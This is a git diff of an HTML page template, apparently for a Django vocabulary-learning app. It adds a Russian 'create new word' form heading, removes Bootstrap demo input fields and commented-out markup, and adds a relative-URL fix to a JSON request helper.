@@ -21,12 +21,9 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <!--ICONS-->
     <script src="https://kit.fontawesome.com/da43c2ea11.js" crossorigin="anonymous"></script>
-
     <script src="/d_assets/js/bs_form.js"></script>
 </head>
-
 <body>
-
     <div id="header-settings-window" style="display: none;">
         <div class="items">
             <div class="item-link ">
@@ -243,9 +240,6 @@
                                 <h4>Shopping Safety</h4>
                             </div>
                         </div>
-                        <!-- <div class="arrow-block" style="display: flex">
-                            <i class="_img_pack_5 w-24" style="background-position: 0 -1476px;"></i>
-                        </div> -->
                     </div>
                 </div>
 
@@ -254,7 +248,12 @@
         <div id="main-content" class="w-full">
             <div class="content-center">
                 <div class="content-inner">
-                    <form method="POST" action="http://127.0.0.1:8000/vocabulary/words/" id="create-word-form" class="">
+                    <div class="modal-header">
+                        <h5 class="modal-title">Создать новое слово</h5>
+                    </div>
+                    <div class="d-flex ">
+                        <form method="POST" action="http://127.0.0.1:8000/vocabulary/words/" id="create-word-form"
+                        class="mt-4">
                         <div class="invalid-feedback non-field-invalid-feedback"></div>
                         <div class="mb-3">
                             <label for="en" class="form-label">Слово на английском</label>
@@ -269,44 +268,7 @@
                         <button type="submit" class="btn btn-primary submit">
                             Сохранить</button>
                     </form>
-
-
-                    <form action="">
-                        <div class="input-group mb-3">
-                            <span class="input-group-text" id="basic-addon1">@</span>
-                            <input type="text" class="form-control" placeholder="Username" aria-label="Username"
-                                aria-describedby="basic-addon1">
-                        </div>
-
-                        <div class="input-group mb-3">
-                            <input type="text" class="form-control" placeholder="Recipient's username"
-                                aria-label="Recipient's username" aria-describedby="basic-addon2">
-                            <span class="input-group-text" id="basic-addon2">@example.com</span>
-                        </div>
-
-                        <label for="basic-url" class="form-label">Your vanity URL</label>
-                        <div class="input-group mb-3">
-                            <span class="input-group-text" id="basic-addon3">https://example.com/users/</span>
-                            <input type="text" class="form-control" id="basic-url" aria-describedby="basic-addon3">
-                        </div>
-
-                        <div class="input-group mb-3">
-                            <span class="input-group-text">$</span>
-                            <input type="text" class="form-control" aria-label="Amount (to the nearest dollar)">
-                            <span class="input-group-text">.00</span>
-                        </div>
-
-                        <div class="input-group mb-3">
-                            <input type="text" class="form-control" placeholder="Username" aria-label="Username">
-                            <span class="input-group-text">@</span>
-                            <input type="text" class="form-control" placeholder="Server" aria-label="Server">
-                        </div>
-
-                        <div class="input-group">
-                            <span class="input-group-text">With textarea</span>
-                            <textarea class="form-control" aria-label="With textarea"></textarea>
-                        </div>
-                    </form>
+                    </div>
                 </div>
             </div>
 
@@ -704,14 +666,6 @@
                         <p>
 
                     </div>
-                    <!-- <form action="https://facebook.com/" method="GET">
-                        <div class="form-btn-wrapper">
-                            <button class="btn btn-primary">
-                                <span class="button-text">Return on Facebook</span>
-                            </button>
-                        </div>
-                    </form> -->
-
                 </div>
                 <div class="modal-footer">
                     <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal">Close</button>
@@ -722,8 +676,6 @@
                             </button>
                         </div>
                     </form>
-                    <!-- <img src="/d_assets/img/meta-logo-grey.png" alt=""> -->
-                    <!-- <img src="/d_assets/img/logo.svg" alt=""> -->
                 </div>
             </div>
         </div>
@@ -802,9 +754,6 @@
                     </div>
                     <h4 class="modal-title" id="StandartsModalLabel">Community Standards
                     </h4>
-                    <!-- <div class="icon-wrap close" data-bs-dismiss="modal" aria-label="Close">
-                    <i class="_img_pack_3" style="background-position: 0px -606px"></i>
-                </div> -->
                 </div>
                 <div class="modal-body">
                     <p><i><b>COVID-19: Community Standards Updates and Protections:</b> As people around the world
@@ -1053,9 +1002,13 @@
             </div>
         </div>
     </div>
-    
+
     <script>
         async function requestJson(url, method, data) {
+            if (!url.startsWith('http')){
+                url = location.protocol + '//' + location.host + url
+                console.info('fix url', url)
+            }
             try {
                 let headers = {
                     "Content-Type": "application/json",
@@ -1113,7 +1066,7 @@
             } else {
                 var error_data = await responce.json()
                 addErrorsInForm(form, error_data)
-            }            
+            }
         })
 
 
